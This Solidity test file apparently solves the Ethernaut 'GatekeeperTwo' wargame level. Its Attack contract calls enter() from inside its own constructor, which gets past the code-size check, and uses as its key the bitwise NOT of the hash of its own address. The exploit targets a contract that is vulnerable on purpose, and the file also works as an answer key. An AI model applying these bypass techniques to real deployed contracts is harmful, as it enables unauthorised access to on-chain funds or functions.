// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperTwo.sol";
import "src/levels/GatekeeperTwoFactory.sol";

contract TestGatekeeperTwo is BaseTest {
    GatekeeperTwo private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new GatekeeperTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperTwo(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // Solve the Challenge
        vm.startPrank(player, player);
        Attack attack = new Attack(levelAddress);
        
        assertEq(level.entrant(), player);
    }
}

contract Attack {
    constructor(address _target) public {
        uint64 key;
        uint64 attack = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        assembly {
            key := not(attack)
        }
        GatekeeperTwo(_target).enter(bytes8(key));
    }
}